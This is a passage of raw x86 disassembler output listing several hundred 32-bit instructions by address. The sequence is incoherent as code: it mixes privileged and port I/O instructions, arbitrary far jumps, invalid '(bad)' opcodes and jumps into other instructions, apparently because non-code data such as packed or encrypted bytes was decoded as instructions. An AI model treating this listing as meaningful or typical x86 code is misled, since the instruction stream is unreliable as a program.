  40dfd2:	mov    ebp,0xa11e64e9
  40dfd7:	jnp    0x40dfeb
  40dfd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfda:	or     DWORD PTR [ebx+0x54136573],ebp
  40dfe0:	ffreep st(1)
  40dfe2:	push   esi
  40dfe3:	jae    0x40dfc8
  40dfe5:	ds inc ecx
  40dfe7:	cmp    DWORD PTR [edi+ebp*1+0x77545664],eax
  40dfee:	repnz ins DWORD PTR es:[edi],dx
  40dff0:	cmp    eax,0x51d9291f
  40dff5:	pop    esi
  40dff6:	es loope 0x40e038
  40dff9:	cli    
  40dffa:	or     bh,BYTE PTR [ebx+ebx*8]
  40dffd:	popf   
  40dffe:	or     edi,edi
  40e000:	repz fucomp st(6)
  40e003:	iret   
  40e004:	stc    
  40e005:	sbb    eax,0x5736c6e7
  40e00a:	sub    DWORD PTR [ebx-0xc11ebec],esp
  40e010:	clc    
  40e011:	call   0x8574:0xc5bb85bd
  40e018:	pop    edx
  40e019:	add    al,0x63
  40e01b:	jge    0x40dff8
  40e01d:	dec    ebp
  40e01e:	inc    ecx
  40e01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e020:	clc    
  40e021:	ret    0xf0fd
  40e024:	mov    al,ds:0x670cd3ba
  40e029:	or     eax,0xea85f31f
  40e02e:	xor    BYTE PTR [edi+0x1c],ah
  40e031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e032:	sti    
  40e033:	push   ecx
  40e034:	add    DWORD PTR [edi+0x1e2a18c1],ecx
  40e03a:	ficom  DWORD PTR [ebx+0x5a88b10b]
  40e040:	dec    edi
  40e041:	xchg   ebp,eax
  40e042:	adc    dh,BYTE PTR [edx+ecx*2]
  40e045:	xchg   DWORD PTR [esi-0x2056bf13],edx
  40e04b:	push   edx
  40e04c:	mov    eax,esi
  40e04e:	mov    eax,0xd8146dcd
  40e053:	neg    DWORD PTR [edx+0x5ec86546]
  40e059:	cmp    bh,BYTE PTR [ebp+0x1c995f2f]
  40e05f:	retf   
  40e060:	jl     0x40e0bb
  40e062:	sbb    al,0x94
  40e064:	call   0xafbe782f
  40e069:	ret    
  40e06a:	dec    DWORD PTR [edi-0x7c5b9eb9]
  40e070:	int    0x81
  40e072:	out    0x36,eax
  40e074:	iret   
  40e075:	mov    edi,0x29be815e
  40e07a:	mov    eax,0xcf997282
  40e07f:	data16 mov cl,0xe8
  40e083:	or     al,0xde
  40e085:	pop    esi
  40e086:	mov    bh,0x36
  40e088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e089:	or     DWORD PTR [eax-0x1d],0x36
  40e08d:	in     eax,dx
  40e08e:	mov    WORD PTR [edx+0x1a3288da],es
  40e094:	rcl    al,cl
  40e096:	int    0x5f
  40e098:	cmp    DWORD PTR [ebx-0x2fc489e2],eax
  40e09e:	imul   eax,DWORD PTR [ecx-0x643089da],0x43
  40e0a5:	mov    bl,0x3b
  40e0a7:	jbe    0x40e0ae
  40e0a9:	adc    al,0x94
  40e0ab:	sbb    al,0x4c
  40e0ad:	cmp    BYTE PTR [eax-0x4b8d2507],dl
  40e0b3:	data16 fadd st(7),st
  40e0b6:	cmc    
  40e0b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0b8:	jbe    0x40e0bd
  40e0ba:	push   cs
  40e0bb:	ins    DWORD PTR es:[edi],dx
  40e0bc:	add    eax,0x3e2255c0
  40e0c1:	aas    
  40e0c2:	pop    esi
  40e0c3:	hlt    
  40e0c4:	pop    eax
  40e0c5:	ja     0x40e0f6
  40e0c7:	iret   
  40e0c8:	inc    esp
  40e0c9:	mov    ?,WORD PTR [ebx+ecx*8+0x6b]
  40e0cd:	loop   0x40e0cb
  40e0cf:	mov    ecx,0x43c7264c
  40e0d4:	inc    esp
  40e0d6:	aas    
  40e0d7:	adc    eax,0x221cda84
  40e0dc:	xlat   BYTE PTR ds:[ebx]
  40e0dd:	sbb    al,0xa7
  40e0df:	in     eax,dx
  40e0e0:	out    dx,eax
  40e0e1:	or     BYTE PTR ds:0x96d818af,0xd9
  40e0e8:	push   ebx
  40e0e9:	push   es
  40e0ea:	(bad)  
  40e0eb:	(bad)  
  40e0ec:	cmp    ebp,DWORD PTR [edx]
  40e0ee:	push   es
  40e0ef:	retf   0xde21
  40e0f2:	ds mov bl,0xa1
  40e0f5:	cld    
  40e0f6:	xor    ebx,DWORD PTR [eax]
  40e0f8:	pop    esi
  40e0f9:	ds jno 0x40e16b
  40e0fc:	xchg   esi,eax
  40e0fd:	xchg   ebp,eax
  40e0fe:	out    0xad,al
  40e100:	push   esi
  40e101:	loopne 0x40e180
  40e103:	ja     0x40e12f
  40e105:	test   eax,0xbd8ca3ef
  40e10a:	add    BYTE PTR [ebx-0x3cd63c29],dh
  40e110:	loope  0x40e0dd
  40e112:	mov    WORD PTR ds:0x88954d27,?
  40e118:	mov    eax,ds:0x738b629d
  40e11d:	mov    ds:0xea080f54,al
  40e122:	imul   ecx,DWORD PTR [eax+0x5c],0x43
  40e126:	or     ebx,DWORD PTR [ecx+0x4a27aa5b]
  40e12c:	xor    al,BYTE PTR [eax+0x7c00eb96]
  40e132:	popa   
  40e133:	aas    
  40e134:	adc    ah,al
  40e136:	ds or  eax,0x42ffb673
  40e13c:	dec    ebp
  40e13d:	xor    al,0xf8
  40e13f:	and    esi,DWORD PTR [esi-0x61]
  40e142:	out    0x71,al
  40e144:	pushf  
  40e145:	and    DWORD PTR [ecx+0x38a02937],0x21
  40e14c:	mov    eax,0x4010aac2
  40e151:	repnz fmul QWORD PTR [edi]
  40e154:	mov    esi,0x35fe8ab3
  40e159:	rcr    BYTE PTR [edi],cl
  40e15b:	inc    ecx
  40e15c:	and    ah,BYTE PTR [ebp+ebx*2+0x52]
  40e160:	into   
  40e161:	add    eax,0xebd99a54
  40e166:	xchg   BYTE PTR [ecx+0x131d13cb],ch
  40e16c:	xor    BYTE PTR [edx+eax*1],bl
  40e16f:	(bad)  
  40e170:	adc    eax,0x22eb71b0
  40e175:	les    edx,FWORD PTR [edx-0x44]
  40e178:	mov    al,0xec
  40e17a:	(bad)  
  40e17b:	push   edx
  40e17c:	cwde   
  40e17d:	std    
  40e17e:	les    ebx,FWORD PTR [esi-0x68577b4]
  40e184:	loopne 0x40e182
  40e186:	dec    ebx
  40e187:	mov    ebp,0x8281e6c2
  40e18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e18d:	xlat   BYTE PTR ds:[ebx]
  40e18e:	adc    eax,0x1d224886
  40e193:	jmp    0x7462:0xeef6d651
  40e19a:	test   al,0xa9
  40e19c:	js     0x40e202
  40e19e:	sbb    DWORD PTR [ecx-0x79831ac0],edi
  40e1a4:	push   esp
  40e1a5:	ret    0x7234
  40e1a8:	mov    esi,0xcc9e6ce
  40e1ad:	(bad)  
  40e1ae:	(bad)  
  40e1af:	sub    DWORD PTR [ebx+0x34],ecx
  40e1b2:	fcomp  QWORD PTR gs:[ebx-0x1457c722]
  40e1b9:	push   0x1247e6f4
  40e1be:	add    DWORD PTR [ebx-0x78],ecx
  40e1c1:	sbb    al,bl
  40e1c3:	repnz arpl WORD PTR [ecx],bx
  40e1c6:	and    BYTE PTR [eax],dh
  40e1c8:	jge    0x40e17c
  40e1ca:	add    BYTE PTR [edx+eax*4],bl
  40e1cd:	and    cl,BYTE PTR [esi-0x2ccd2a03]
  40e1d3:	cmp    DWORD PTR [ecx-0x6f33ec44],ecx
  40e1d9:	mov    bh,0x83
  40e1db:	into   
  40e1dc:	or     al,BYTE PTR [ecx+0x7d]
  40e1df:	jp     0x40e1d0
  40e1e1:	cmp    DWORD PTR [edi],0x44244000
  40e1e7:	mov    dl,0xfc
  40e1e9:	jae    0x40e183
  40e1eb:	jns    0x40e16f
  40e1ed:	cli    
  40e1ee:	lods   eax,DWORD PTR ds:[esi]
  40e1ef:	add    esi,edi
  40e1f1:	imul   esp,DWORD PTR [ecx-0x6a29f965],0x14
  40e1f8:	lea    eax,[edi+0xe]
  40e1fb:	jecxz  0x40e192
  40e1fd:	cs scas eax,DWORD PTR es:[edi]
  40e1ff:	or     eax,0x758be8b3
  40e204:	stos   DWORD PTR es:[edi],eax
  40e205:	call   0x5479:0xd3b9b891
  40e20c:	data16 jle 0x40e235
  40e20f:	aam    0xaa
  40e211:	addr16 inc edi
  40e213:	or     ah,bh
  40e215:	sar    bh,0xb6
  40e218:	or     al,0x9f
  40e21a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e21b:	shr    BYTE PTR [ebp-0x249c0e65],1
  40e221:	adc    eax,0x29e77106
  40e226:	adc    DWORD PTR [ebx+0x2b45ffca],esp
  40e22c:	ficom  DWORD PTR [eax]
  40e22e:	(bad)  
  40e22f:	retf   
  40e230:	out    0x93,eax
  40e232:	(bad)  
  40e233:	cmp    eax,0xf79d1675
  40e238:	adc    esi,DWORD PTR [edi]
  40e23a:	dec    BYTE PTR [ebx+0x4ae7eb5d]
  40e240:	loope  0x40e252
  40e242:	les    edi,FWORD PTR [ebp-0x78]
  40e245:	push   ss
  40e246:	sub    al,0xdb
  40e248:	(bad)  
  40e249:	pop    ecx
  40e24a:	test   al,0x1b
  40e24c:	outs   dx,DWORD PTR ds:[esi]
  40e24d:	(bad)  
  40e24e:	mov    esi,DWORD PTR [ecx-0x36192df3]
  40e254:	mov    eax,ds:0x6b2102bd
  40e259:	shl    DWORD PTR [ebx+esi*1],0xd2
  40e25d:	std    
  40e25e:	xor    cl,BYTE PTR [esi+0x1a]
  40e261:	dec    ebx
  40e262:	or     al,0x20
  40e264:	js     0x40e1eb
  40e266:	inc    eax
  40e267:	mov    esi,DWORD PTR [ebx]
  40e269:	mov    esi,0xe29cbf42
  40e26e:	lods   al,BYTE PTR ds:[esi]
  40e26f:	jmp    0x3775:0x20176d62
  40e276:	xchg   ecx,eax
  40e277:	call   DWORD PTR [ebx]
  40e279:	mov    al,0x9
  40e27b:	jmp    0x3f4e:0xc5457129
  40e282:	push   ecx
  40e283:	ror    DWORD PTR [esi],1
  40e285:	jmp    0xda9bdcbf
  40e28a:	aaa    
  40e28b:	push   es
  40e28c:	xor    ebx,DWORD PTR [ebx]
  40e28e:	pop    ss
  40e28f:	mov    bh,0x2c
  40e291:	shl    ah,0x7e
  40e294:	jp     0x40e275
  40e296:	mov    dh,0xf3
  40e298:	jae    0x40e280
  40e29a:	and    bl,cl
  40e29c:	fimul  WORD PTR [ecx-0x77eedae3]
  40e2a2:	aad    0x51
  40e2a4:	mov    dl,0xf9
  40e2a6:	mov    DWORD PTR [ebx],esi
  40e2a8:	repnz aas 
  40e2aa:	push   ebx
  40e2ab:	or     bl,BYTE PTR [edx]
  40e2ad:	inc    ecx
  40e2ae:	add    eax,0x1e285fea
  40e2b3:	xor    esp,DWORD PTR [eax]
  40e2b5:	repz adc eax,0x38c8bb99
  40e2bb:	dec    ebx
  40e2bc:	sbb    cl,BYTE PTR [esi]
  40e2be:	nop
  40e2bf:	jno    0x40e33e
  40e2c1:	and    BYTE PTR [ecx],dl
  40e2c3:	out    dx,al
  40e2c4:	rcl    BYTE PTR ds:0xb517b8bd,1
  40e2ca:	adc    BYTE PTR [eax-0x13ddbf01],ch
  40e2d0:	mov    bh,0x45
  40e2d2:	loope  0x40e2c9
  40e2d4:	push   cs
  40e2d5:	test   BYTE PTR [edi+esi*8],dl
  40e2d8:	xchg   edx,eax
  40e2d9:	sub    eax,0x32d57dd8
  40e2de:	cmp    al,0xb4
  40e2e0:	xchg   ecx,eax
  40e2e1:	dec    esp
  40e2e2:	scas   eax,DWORD PTR es:[edi]
  40e2e3:	dec    esp
  40e2e4:	int3   
  40e2e5:	xchg   esp,eax
  40e2e6:	data16 hlt 
  40e2e8:	jns    0x40e322
  40e2ea:	enter  0x9b94,0x90
  40e2ee:	pop    edi
  40e2ef:	adc    DWORD PTR [ecx],esp
  40e2f1:	pusha  
  40e2f2:	mov    dh,0x4f
  40e2f4:	sbb    al,0x42
  40e2f6:	adc    cl,BYTE PTR [ecx+0x77118b90]
  40e2fc:	pop    es
  40e2fd:	add    ebx,DWORD PTR fs:[ebx]
  40e300:	sti    
  40e301:	dec    esi
  40e302:	xchg   ebx,eax
  40e303:	(bad)  
  40e304:	mov    esp,0x8ea8b1fb
  40e309:	jmp    0x40e2dd
  40e30b:	imul   ebp
  40e30d:	lods   eax,DWORD PTR ds:[esi]
  40e30e:	or     BYTE PTR [edi],ch
  40e310:	enter  0xf118,0x57
  40e314:	js     0x40e304
  40e316:	(bad)  
  40e317:	(bad)  
  40e318:	mov    ch,0xa6
  40e31a:	cmp    BYTE PTR [edx],0x50
  40e31d:	scas   eax,DWORD PTR es:[edi]
  40e31e:	xor    al,0x5
  40e320:	push   edi
  40e321:	mov    ds,WORD PTR [edx+edx*4+0x58]
  40e325:	retf   
  40e326:	pop    esp
  40e327:	xor    DWORD PTR [edi+0x746993ed],0x19394074
  40e331:	and    BYTE PTR [ecx],0x75
  40e334:	(bad)  
  40e335:	mov    bl,0x21
  40e337:	in     al,0xa9
  40e339:	int3   
  40e33a:	mov    edi,0x8932ecec
  40e33f:	cli    
  40e340:	mov    ds:0x3e3de552,al
  40e345:	pop    ebx
  40e346:	or     DWORD PTR [ebx-0x56],ecx
  40e349:	xor    DWORD PTR [esp+eiz*8+0x13c8b22b],edi
  40e350:	dec    ecx
  40e351:	push   edi
  40e352:	stos   DWORD PTR es:[edi],eax
  40e353:	popf   
  40e354:	addr16 std 
  40e356:	push   ecx
  40e357:	sub    BYTE PTR [esp+ebp*4+0x2847d986],ah
  40e35e:	adc    ch,cl
  40e360:	mov    eax,ds:0xf2aaf744
  40e365:	mov    ebx,edi
  40e367:	je     0x40e327
  40e369:	lea    ebp,[ebp-0x3e]
  40e36c:	stc    
  40e36d:	inc    ebx
  40e36e:	sbb    DWORD PTR [edx+ebp*8],0xffffff95
  40e372:	jne    0x40e3a8
  40e374:	xchg   ebp,eax
  40e375:	cmp    al,0xb5
  40e377:	repnz mov al,BYTE PTR [edx]
  40e37a:	pop    ebx
  40e37b:	pop    esi
  40e37c:	test   DWORD PTR [esi-0x1f404a15],ecx
  40e382:	dec    ebp
  40e383:	out    dx,al
  40e384:	xchg   BYTE PTR [ebx+0x6d],ah
  40e387:	mov    bh,0x1b
  40e389:	outs   dx,DWORD PTR ds:[esi]
  40e38a:	xchg   ebp,eax
  40e38b:	pop    ebx
  40e38c:	and    eax,0x28bbbe7f
  40e391:	mov    ch,BYTE PTR [edi]
  40e393:	dec    esp
  40e394:	pusha  
  40e395:	sub    eax,0x44cdaa20
  40e39a:	ret    0xf826
  40e39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e39e:	fs in  eax,0x9b
  40e3a1:	jb     0x40e383
  40e3a3:	cli    
  40e3a4:	lea    ebp,[ebx+edx*2+0x64]
  40e3a8:	xchg   edx,eax
  40e3a9:	outs   dx,BYTE PTR ds:[esi]
  40e3aa:	jmp    0x38b9a33f
  40e3af:	mov    BYTE PTR [ecx-0x29adbabd],ch
  40e3b5:	sbb    edx,DWORD PTR [edx-0x24]
  40e3b8:	jno    0x40e35d
  40e3ba:	les    ebp,FWORD PTR [ecx]
  40e3bc:	cwde   
  40e3bd:	push   cs
  40e3be:	stos   DWORD PTR es:[edi],eax
  40e3bf:	pop    ss
  40e3c0:	cmp    al,0xc1
  40e3c2:	sub    eax,DWORD PTR [edx-0x4a49803d]
  40e3c8:	push   edx
  40e3c9:	mov    dh,0xf8
  40e3cb:	(bad)  
  40e3cc:	test   edi,0xc997af89
  40e3d2:	sub    DWORD PTR [eax+0x70],0xa80f2547
  40e3d9:	loop   0x40e3a5
  40e3db:	stos   BYTE PTR es:[edi],al
  40e3dc:	stos   BYTE PTR es:[edi],al
  40e3dd:	sbb    al,0x19
  40e3df:	xchg   ecx,eax
  40e3e0:	lahf   
  40e3e1:	out    dx,al
  40e3e2:	inc    edx
  40e3e3:	idiv   BYTE PTR [edx]
  40e3e5:	(bad)  
  40e3e6:	pop    DWORD PTR [ebx-0x13]
  40e3e9:	cld    
  40e3ea:	sub    esi,DWORD PTR [esi]
  40e3ec:	iret   
  40e3ed:	mov    BYTE PTR [ecx],dh
  40e3ef:	xchg   ebx,eax
  40e3f0:	pop    edx
  40e3f1:	push   esp
  40e3f2:	pop    edx
  40e3f3:	shl    BYTE PTR ds:0x94557abc,cl
  40e3f9:	inc    DWORD PTR [eax]
  40e3fb:	bound  edx,QWORD PTR [ebp+0x32d66496]
  40e401:	inc    ebp
  40e402:	rol    DWORD PTR [ebp-0x2e72a4be],cl
  40e408:	pop    ebp
  40e409:	(bad)  
  40e40b:	in     al,dx
  40e40c:	push   0x8b7150bd
  40e411:	pop    ss
  40e412:	scas   al,BYTE PTR es:[edi]
  40e413:	outs   dx,DWORD PTR ds:[esi]
  40e414:	aaa    
  40e415:	shr    DWORD PTR [edi],0x32
  40e418:	and    eax,0x216b9dc
  40e41d:	add    eax,0x32de8acc
  40e422:	inc    eax
  40e423:	out    dx,al
  40e424:	int    0x3b
  40e426:	iret   
  40e427:	int    0x8a
  40e429:	mov    ds:0xa625902c,al
  40e42e:	mov    eax,0xa14f40d2
  40e433:	clc    
  40e434:	fs pusha 
  40e436:	jbe    0x40e427
  40e438:	dec    ebp
  40e439:	mov    bh,0x81
  40e43b:	mov    esp,0xd5fea560
  40e440:	jp     0x40e491
  40e442:	pop    ebx
  40e443:	fnsave es:[edi-0xc]
  40e447:	sahf   
  40e448:	xchg   BYTE PTR [ecx-0x6f0c4b38],cl
  40e44e:	mov    esp,0x83642332
  40e453:	sub    al,0x8a
  40e455:	icebp  
  40e456:	sbb    DWORD PTR [eax-0x60],eax
  40e459:	adc    eax,DWORD PTR [edi-0x40]
  40e45c:	jl     0x40e4b3
  40e45e:	fistp  QWORD PTR [esi]
  40e460:	rcl    DWORD PTR [edx-0x5ac7c729],1
  40e466:	retf   0xbad7
  40e469:	scas   eax,DWORD PTR es:[edi]
  40e46a:	jecxz  0x40e461
  40e46c:	sahf   
  40e46d:	lods   al,BYTE PTR ds:[esi]
  40e46e:	fisubr WORD PTR [ebx+esi*4+0x6684b7ed]
  40e475:	jae    0x40e41e
  40e477:	push   ecx
  40e478:	or     al,0x3f
  40e47a:	sti    
  40e47b:	stos   BYTE PTR es:[edi],al
  40e47c:	mov    eax,0xd1002341
  40e481:	mul    DWORD PTR [esi+0x1f816cd8]
  40e487:	xor    edi,ebx
  40e489:	adc    eax,0xf1e09226
  40e48e:	in     al,0x1
  40e490:	out    0xb5,al
  40e492:	out    dx,al
  40e493:	(bad)  
  40e494:	ret    
  40e495:	mov    ecx,0xb76a6a65
  40e49a:	mov    ch,0x1b
  40e49c:	fcom   DWORD PTR [ecx+eax*4]
  40e49f:	int3   
  40e4a0:	repz xchg ebp,eax
  40e4a2:	or     BYTE PTR [ecx],dl
  40e4a4:	cs push ecx
  40e4a6:	dec    ebp
  40e4a7:	je     0x40e47c
  40e4a9:	or     BYTE PTR [ebx+0x3c17062d],0x6
  40e4b0:	xlat   BYTE PTR ds:[ebx]
  40e4b1:	sub    bh,BYTE PTR [esi+0x41405492]
  40e4b7:	fbstp  TBYTE PTR [ecx-0x26]
  40e4ba:	xor    BYTE PTR [esi],bh
  40e4bc:	push   edx
  40e4bd:	or     edi,edx
  40e4bf:	xchg   BYTE PTR [eax],bh
  40e4c1:	fwait
  40e4c2:	pop    ebx
  40e4c3:	loope  0x40e461
  40e4c5:	mov    ds:0x89a3dff4,eax
  40e4ca:	outs   dx,BYTE PTR ds:[esi]
  40e4cb:	in     al,0x43
  40e4cd:	rcl    DWORD PTR [eax+0x19],1
  40e4d0:	jl     0x40e4b5
  40e4d2:	pop    esp
  40e4d3:	in     al,dx
  40e4d4:	test   eax,0x537ed8d2
  40e4d9:	dec    esi
  40e4da:	out    dx,eax
  40e4db:	cli    
  40e4dc:	sbb    al,0xdd
  40e4de:	faddp  st(0),st
  40e4e0:	push   ebp
  40e4e1:	dec    eax
  40e4e2:	cmp    al,0xe1
  40e4e4:	icebp  
  40e4e5:	inc    edx
  40e4e6:	bound  ecx,QWORD PTR [ebx]
  40e4e8:	add    DWORD PTR [edx-0x8],edi
  40e4eb:	jb     0x40e4f4
  40e4ed:	rcr    cl,1
  40e4ef:	mov    edi,0xc6116a77
  40e4f4:	ret    
  40e4f5:	retf   0x50d0
  40e4f8:	neg    BYTE PTR [ebx]
  40e4fa:	push   0x3d
  40e4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4fd:	dec    ecx
  40e4fe:	nop
  40e4ff:	fdiv   DWORD PTR [ebp-0x6b]
  40e502:	shl    BYTE PTR [ecx-0x49],1
  40e505:	or     eax,0xb07421fa
  40e50a:	sub    bh,dl
  40e50c:	xor    dl,0xde
  40e50f:	jmp    0x40e57c
  40e511:	xor    eax,0xc9335bd
  40e516:	xlat   BYTE PTR ds:[ebx]
  40e517:	test   BYTE PTR [ebx+0x35e3b292],dl
  40e51d:	test   eax,0x9e6f2903
  40e522:	jge    0x40e537
  40e524:	mov    ebp,0x4e6ccbe2
  40e529:	retf   
  40e52a:	in     eax,dx
  40e52b:	cdq    
  40e52c:	or     bl,dh
  40e52e:	stos   DWORD PTR es:[edi],eax
  40e52f:	(bad)
  40e533:	shl    DWORD PTR [edi],1
  40e535:	dec    ebx
  40e536:	pusha  
  40e537:	push   ecx
  40e538:	enter  0xacd2,0x5e
  40e53c:	lds    edx,FWORD PTR [edx+0xf]
  40e53f:	mov    bh,0x2e
  40e541:	and    DWORD PTR [ecx+0x4f],ebp
  40e544:	jecxz  0x40e58f
  40e546:	mov    edx,0x6ffda66e
  40e54b:	mov    edx,0x2a77cfdb
  40e550:	inc    ebp
  40e551:	mov    ds:0x4d1274d7,eax
  40e556:	mov    ebx,0xe2544380
  40e55b:	and    eax,0xb014d7d0
  40e560:	and    DWORD PTR [ecx+0x3cb6bc11],0xffffffb2
  40e567:	jnp    0x40e56c
  40e569:	dec    BYTE PTR [ebx-0x78]
  40e56c:	add    ch,BYTE PTR [edi+0x32]
  40e56f:	push   eax
  40e570:	rol    DWORD PTR [ecx+0x2a],0x10
  40e574:	cdq    
  40e575:	loope  0x40e501
  40e577:	jno    0x40e528
  40e579:	repz dec esp
  40e57b:	or     eax,0x8e47e06c
  40e580:	test   DWORD PTR [edi],edx
  40e582:	jae    0x40e545
  40e584:	sbb    BYTE PTR [edi],al
  40e586:	pop    esp
  40e587:	out    0xc7,eax
  40e589:	pop    ebp
  40e58a:	or     DWORD PTR [edx-0x1c195b8e],edi
  40e590:	fcomi  st,st(6)
  40e592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e593:	sbb    al,0x1c
  40e595:	mov    ?,WORD PTR [edx]
  40e597:	xor    al,BYTE PTR [ebp+0x51]
  40e59a:	lea    edx,cs:[edx+0x5664e0de]
  40e5a1:	adc    eax,0x1038d97f
  40e5a6:	push   ss
  40e5a7:	cmp    DWORD PTR [ebx-0x68],0x7ffecbb
  40e5ae:	enter  0x6641,0x2d
  40e5b2:	inc    edx
  40e5b3:	hlt    
  40e5b4:	mov    bh,0x6e
  40e5b6:	mov    ebp,0xf4cb3cb9
  40e5bb:	adc    dl,BYTE PTR [edi]
  40e5bd:	dec    esi
  40e5be:	xor    eax,0x86f5c91a
  40e5c3:	pop    esi
  40e5c4:	mov    esi,0x9a97009a
  40e5c9:	mov    dl,0x24
  40e5cb:	stmxcsr DWORD PTR [eax+ecx*2]
  40e5cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5d0:	ins    DWORD PTR es:[edi],dx
  40e5d1:	xchg   esp,eax
  40e5d2:	jecxz  0x40e5cf
  40e5d4:	icebp  
  40e5d5:	nop
  40e5d6:	popa   
  40e5d7:	ins    DWORD PTR es:[edi],dx
  40e5d8:	adc    al,0xf6
  40e5da:	in     al,0xab
  40e5dc:	inc    esp
  40e5dd:	xchg   edi,eax
  40e5de:	add    eax,0x8183013d
  40e5e3:	cmp    eax,0x327cb02b
  40e5e8:	ret    0x30e3
  40e5eb:	inc    edi
  40e5ec:	jl     0x40e5cc
  40e5ee:	xor    DWORD PTR [edi+edx*2+0xd],0xffffffd0
  40e5f3:	push   ebx
  40e5f4:	push   0x34
  40e5f6:	mov    WORD PTR [ecx*2+0x3ffb1861],ds
  40e5fd:	enter  0x9c6d,0xc1
  40e601:	xor    edi,DWORD PTR [edi-0x6f]
  40e604:	je     0x40e651
  40e606:	fnsave [esi+0x46133ea8]
  40e60c:	(bad)  
  40e60d:	cmp    dh,ah
  40e60f:	push   ss
  40e610:	adc    ebp,DWORD PTR [edi-0x71e70a41]
  40e616:	clc    
  40e617:	mov    esp,0x561f0de
  40e61c:	fwait
  40e61d:	xchg   esi,eax
  40e61e:	fidiv  WORD PTR [eax-0x1d]
  40e621:	jl     0x40e5ab
  40e623:	dec    edi
  40e624:	mov    ah,0x15
  40e626:	xchg   edi,eax
  40e627:	in     eax,0x94
  40e629:	push   eax
  40e62a:	add    eax,0xa7324234
  40e62f:	sub    eax,0x119e4eb9
  40e634:	xlat   BYTE PTR ds:[ebx]
  40e635:	ficomp DWORD PTR [edx-0x48cbf3ad]
  40e63b:	pop    esi
  40e63c:	xchg   ecx,eax
  40e63d:	jge    0x40e66c
  40e63f:	in     eax,dx
  40e640:	pop    edi
  40e641:	and    eax,0x9ed360ac
  40e646:	sti    
  40e647:	sub    edx,esp
  40e649:	push   es
  40e64a:	imul   esp,DWORD PTR [ecx],0xffffffac
  40e64d:	pop    ds
  40e64e:	in     eax,dx
  40e64f:	dec    esp
  40e650:	jg     0x40e6d1
  40e652:	xchg   edi,eax
  40e653:	jecxz  0x40e63a
  40e655:	enter  0x5a1a,0xc
  40e659:	test   al,0x4c
  40e65b:	dec    BYTE PTR [ebp+0x2a]
  40e65e:	inc    ebp
  40e65f:	pop    ss
  40e660:	loope  0x40e5f0
  40e662:	dec    ecx
  40e663:	mov    ds:0x657f1e6e,eax
  40e668:	jno    0x40e67b
  40e66a:	aad    0x61
  40e66c:	daa    
  40e66d:	lods   al,BYTE PTR ds:[esi]
  40e66e:	ja     0x40e6a6
  40e670:	or     eax,0xf4f9151a
  40e675:	in     al,dx
  40e676:	jno    0x40e5fc
  40e678:	adc    eax,0xa391cf1
  40e67d:	adc    cl,BYTE PTR [ecx]
  40e67f:	and    eax,0x1cb905e2
  40e684:	shl    DWORD PTR [eax],1
  40e686:	dec    eax
  40e687:	pop    edi
  40e688:	mov    esi,0x47605e74
  40e68d:	in     al,dx
  40e68e:	bound  ecx,QWORD PTR [esi+0x5d62e3e1]
  40e694:	cmp    cl,BYTE PTR [eax]
  40e696:	xlat   BYTE PTR ds:[ebx]
  40e697:	ret    
  40e698:	inc    cl
  40e69a:	in     eax,dx
  40e69b:	adc    eax,0xa106b399
  40e6a0:	mov    esi,0x3497cef1
  40e6a5:	xor    al,0x46
  40e6a7:	cmp    eax,0xf517b13a
  40e6ac:	(bad)  
  40e6ad:	sysret 
  40e6af:	rcr    dh,cl
  40e6b1:	std    
  40e6b2:	jbe    0x40e694
  40e6b4:	jge    0x40e6cb
  40e6b6:	push   0xffffff9f
  40e6b8:	ins    BYTE PTR es:[edi],dx
  40e6b9:	test   al,0x7c
  40e6bb:	(bad)  
  40e6bc:	push   ss
  40e6bd:	jbe    0x40e729
  40e6bf:	mov    edi,0xc1accf26
  40e6c4:	dec    edi
  40e6c5:	or     eax,0x75c06fd6
  40e6ca:	cdq    
  40e6cb:	div    DWORD PTR [edx+edi*2+0x3d]
  40e6cf:	jb     0x40e703
  40e6d1:	stc    
  40e6d2:	cwde   
  40e6d3:	mov    al,ds:0x5ac0efb9
  40e6d8:	leave  
  40e6d9:	push   ebp
  40e6da:	cmp    ah,BYTE PTR [ebp+0x67]
  40e6dd:	inc    esi
  40e6de:	aam    0x71
  40e6e0:	jae    0x40e747
  40e6e2:	int    0xb2
  40e6e4:	test   eax,0x952d4a76
  40e6e9:	(bad)  
  40e6ea:	imul   BYTE PTR [edx-0x27b7d115]
  40e6f0:	test   al,0x8a
  40e6f2:	aad    0x9d
  40e6f4:	add    dl,BYTE PTR [edx+edi*1+0x48]
  40e6f8:	cmp    esi,ecx
  40e6fa:	ins    DWORD PTR es:[edi],dx
  40e6fb:	out    dx,al
  40e6fc:	jb     0x40e6dd
  40e6fe:	stos   DWORD PTR es:[edi],eax
  40e6ff:	sahf   
  40e700:	pop    eax
  40e701:	scas   eax,DWORD PTR es:[edi]
  40e702:	adc    eax,0x6f247683
  40e707:	or     ebx,edx
  40e709:	pop    edx
  40e70a:	dec    esi
  40e70b:	sub    eax,0xf92a9583
  40e710:	pop    eax
  40e711:	pop    es
  40e712:	sahf   
  40e713:	and    al,0x48
  40e715:	mov    ebx,0xa636e7c3
  40e71a:	icebp  
  40e71b:	inc    esi
  40e71c:	hlt    
  40e71d:	test   DWORD PTR [ebx-0x7a08f64],ebp
  40e723:	imul   esp,eax,0x83549806
  40e729:	cwde   
  40e72a:	inc    edi
  40e72b:	ret    0x7d2
  40e72e:	jp     0x40e700
  40e730:	pop    eax
  40e731:	mov    eax,0x898df08e
  40e736:	scas   eax,DWORD PTR es:[edi]
  40e737:	and    al,0xde
  40e739:	jp     0x40e717
  40e73b:	pop    ecx
  40e73c:	ficomp DWORD PTR ds:0xf8258c3
  40e742:	mov    bh,0xc5
  40e744:	jmp    0x40e7c1
  40e746:	cld    
  40e747:	in     al,dx
  40e748:	and    DWORD PTR [edx],esp
  40e74a:	cmp    ah,BYTE PTR [eax-0x2f]
  40e74d:	sbb    DWORD PTR [edi+ebp*4+0x3f57ddde],0x86bcec4f
  40e758:	in     eax,0xc2
